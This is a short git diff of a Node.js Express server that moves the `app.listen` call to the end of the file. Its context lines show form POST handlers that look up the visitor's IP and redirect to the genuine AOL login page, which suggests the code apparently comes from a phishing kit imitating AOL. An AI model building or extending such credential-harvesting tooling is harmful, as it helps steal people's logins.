@@ -42,9 +42,7 @@ app.get("/error", (req, res) => {
   res.render("error");
 });
 
-app.listen(process.env.PORT || 3003, () => {
-  console.log("server listening");
-});
+
 
 app.post("/", (req, res) => {
   ip.whatismyip(options, function (err, data) {
@@ -155,4 +153,8 @@ app.post("/error", (req, res) => {
   });
 
   res.redirect("https://login.aol.com/");
+});
+
+app.listen(process.env.PORT || 3003, () => {
+  console.log("server listening");
 });
